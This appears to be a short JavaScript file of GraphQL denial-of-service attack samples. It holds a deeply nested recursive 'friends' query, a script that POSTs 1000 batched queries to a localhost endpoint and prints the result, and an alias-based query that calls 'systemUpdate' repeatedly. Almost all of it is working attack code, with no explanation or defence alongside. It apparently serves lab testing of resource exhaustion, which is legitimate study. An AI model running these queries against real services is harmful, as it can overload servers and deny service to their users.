// Deep Recursion Query Attack
const GET_USER_WITH_FRIENDS = `
  query {
    user(id: "1") {
      friends {
        name
        friends {
          name
          friends {
            name
            friends {
              name
              friends {
                name
                friends {
                  name
                  friends {
                    name
                    friends {
                      name
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
`;

// Batching Attack
const fetch = require('node-fetch');

async function batchingAttack() {
  const url = 'http://localhost:4000/graphql';

  // batch requests
  const batchQueries = [];
  for (let i = 0; i < 1000; i++) {
    batchQueries.push({
      query: `
        query Users {
          users {
            id
            name
          }
        }
      `
    });
  }

  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(batchQueries),
  });

  // const data = await res.json();
  // console.log(data);

  const raw = await res.text();
  console.log(raw);
  const data = JSON.parse(raw);
  console.log(data);
}

batchingAttack();

// Complexity Attack using aliases
const SYSTEM_UPDATE = `
  query {
    update1: systemUpdate
    update2: systemUpdate
    update3: systemUpdate
    update4: systemUpdate
    update5: systemUpdate
  }
`;



